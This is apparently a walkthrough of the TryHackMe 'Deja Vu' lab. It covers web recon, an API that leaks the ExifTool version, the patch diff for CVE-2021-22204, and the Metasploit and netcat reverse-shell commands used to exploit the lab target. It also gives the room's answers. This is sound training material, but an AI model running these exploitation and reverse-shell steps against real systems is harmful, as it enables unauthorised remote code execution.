# Deja Vu

**Room Link:** [https://tryhackme.com/r/room/dejavu](https://tryhackme.com/r/room/dejavu)



## Dog Pictures - Exploring a webapp

After our initial port scan, we find two open ports. As usual, SSH is not much use without credentials as it's up to date. This just leaves us with a web application to explore.

From Nmap's service version detection, we know that the backend is built in Golang. This hopefully means dynamic content that we can explore.

The first step in exploiting a webapp, like exploiting anything else, is reconnaissance. Exploring the webapp to discover functionality is critical for gaining a basic familiarity with the webapp and potentially how it works. Navigating the webapp without actively trying to exploit the functionality is called walking the happy path. You can learn more about this technique (and a lot more) in this room: [Walking An Application](https://tryhackme.com/room/walkinganapplication).

Open up Burp Suite with your browser of choice (I like the integrated Chromium) and we can start exploring the site.



### Answer the questions

Setup Burp to track the site

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Click around the website. Can you find any developer comments?**

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**Can you find the page that gives more details about a dog photo?**



**Perform an Nmap scan of the target. What version of SSH is in use?**

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1193).png" alt=""><figcaption></figcaption></figure>



## Vulnerability Discovery

After we've gained a basic familiarity with the site, we can start some more active enumeration. A directory brute force scan can help us discover content that's otherwise unreachable through normal browsing, like admin pages or old versions that haven't been removed. With admin pages leading to more application features that might not be hardened, or unmaintained code from outdated versions, we're more likely to find vulnerabilities.

Run a gobuster scan with dirb's `big.txt` wordlist. What can you find? Other tools and wordlists are available.

With an API driven webapp like this, we can see how the application retrieves data to make it dynamic. A great way to do this is Burp Suite, which can automatically map out the target site's structure as we explore.

## Discovering the overly verbose API

Burp Suite's target site map should have discovered 2 API routes that the website uses to retrieve information about the dog pictures. One retrieves the title and caption, and the other is used to retrieve the date and author. The full paths have been redacted, so that you find them yourself.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d96207dd832c106398e2267/room-content/03100fff977a5fb2c6c2c4cc3b82a241.png)\


It appears the API route used to retrieve the date and author does so with EXIF data, and uses Exiftool from the response. It appears the output of the command is simply serialised into JSON and sent to the client. This gives us a lot of information, notably the ExifTool version number. This is considered a vulnerability under the[ OWASP API Top 10](https://owasp.org/www-project-api-security/), more specifically `API3:2019 Excessive Data Exposure`. Usually, exposing version numbers would be considered a low or informational rated issue but as we will discover it can have more serious consequences.

### Answer the questions

**What page can be used to upload your own dog picture?**

/upload/

**What API route is used to provide the Title and Caption for a specific dog image?**

/dog/getmetadata

**What API route does the application use to retrieve further information about the dog picture?**

/dog/getexifdata

**What attribute in the JSON response from this endpoint specifies the version of ExifTool being used by the webapp?**

ExifToolVersion

<figure><img src="../../.gitbook/assets/image (1194).png" alt=""><figcaption></figcaption></figure>



**What version of ExifTool is in use?**

12.23

**What RCE exploit is present in this version of ExifTool? Give the CVE number in format CVE-XXXX-XXXXX**

CVE-2021-22204

## Exploitation

Now that we've discovered a potential method of exploiting the box, we should try it!

Turning our version disclosure into remote code execution massively increases the severity of the issue.

### Why is this exploit interesting?

In the Microsoft ecosystem, there's a concept called "Patch Tuesday"; security patches for Microsoft products are often released on Tuesdays.\
Practically immediately after these patches are released, work begins on creating exploits for the vulnerabilities as many systems will not be immediately updated.

Exiftool follows a similar story here. In early 2021, an exploit was discovered in Exiftool that could lead to arbitrary code execution. The exploit was quickly patched before public proof of concept code started to appear, however many security enthusiasts began to reverse engineer the patch to create an exploit.

### Looking for the patch

Researching the vulnerability, we can see it was assigned CVE-2021-22204. Looking at the [NVD CVE page](https://nvd.nist.gov/vuln/detail/CVE-2021-22204) for the flaw shows that it was patched in 12.24. The page also has a link to the patch, which is very useful here because we can see how they fixed the vulnerability. The git diff is copied below.

```perl
-	230	# must protect unescaped "$" and "@" symbols, and "\" at end of string
-	231	$tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
-	232	# convert C escape sequences (allowed in quoted text)
-	233	$tok = eval qq{"$tok"};
+	230	# convert C escape sequences, allowed in quoted text
+	231	# (note: this only converts a few of them!)
+	232	my %esc = ( a => "\a", b => "\b", f => "\f", n => "\n",
+	233	r => "\r", t => "\t", '"' => '"', '\\' => '\\' );
+	234	$tok =~ s/\\(.)/$esc{$1}||'\\'.$1/egs;
```

### Understanding the code, and the danger

The dangerous function here is the call to eval on line 233. Eval is used to run Perl code that's contained in a variable, and the variable comes from EXIF data in our image. Control over code that's executed is our goal, so it currently seems like the only barrier between us and arbitrary code execution is the filter found on line 231.

```perl
# must protect unescaped "$" and "@" symbols, and "\" at end of string
$tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
```

It's worth explaining the `=~` that's used here. It's a Perl operator usually used with regular expressions, and it can be very very complicated. Importantly for us, the first character after the \~ is 's'. This means that the operator will perform a search and replace with the regular expression that follows.

That regular expression is also very complicated, unfortunately. There's a helpful comment explaining the intent, escaping special characters in the string. Another unfortunate discovery, if we look at the source code surrounding our filter which wasn't captured in the diff, is that this filter also relies on quote marks delimiting the ends of fields.

Combining all this information, we can see how a code injection vulnerability would arise if we can bypass the filter and have Perl `eval` our own code. As this filter is irritating and the exploit is somewhat complex to engineer, we'll simply use Metasploit to craft our exploit. Articles describing how an exploit was created manually are included later.

### Creating our exploit with Metasploit

To create our exploit, we need to first find the Metasploit module for this vulnerability. If you're unfamiliar with locating exploits in Metasploit, try the [TryHackMe Metasploit Intro](https://tryhackme.com/room/metasploitintro) room.\


We then need to set our options appropriately for a reverse shell payload. As it's a Perl command injection vulnerability, we want a command payload rather than a binary payload. Make sure your LHOST is correct and make sure you start a netcat listener!



**More information**

If you didn't like my explanations, want to learn more, or you want to see how the proof of concepts were created, please see the links below.

* [https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)
* [https://blogs.blackberry.com/en/2021/06/from-fix-to-exploit-arbitrary-code-execution-for-cve-2021-22204-in-exiftool](https://blogs.blackberry.com/en/2021/06/from-fix-to-exploit-arbitrary-code-execution-for-cve-2021-22204-in-exiftool)
* [https://www.openwall.com/lists/oss-security/2021/05/10/5](https://www.openwall.com/lists/oss-security/2021/05/10/5)

### Answer the questions

**Generate an image payload with Metasploit**

**Kali**

```
msfconsole
```

**Kali(msfconsole)**

```
search exiftool
use 0
set port 4555
run
```

**Get code execution on the target machine**

**Kali**

```
use exploit/multi/handler
set payload cmd/unix/reverse netcat
set lhost 10.10.51.9
```

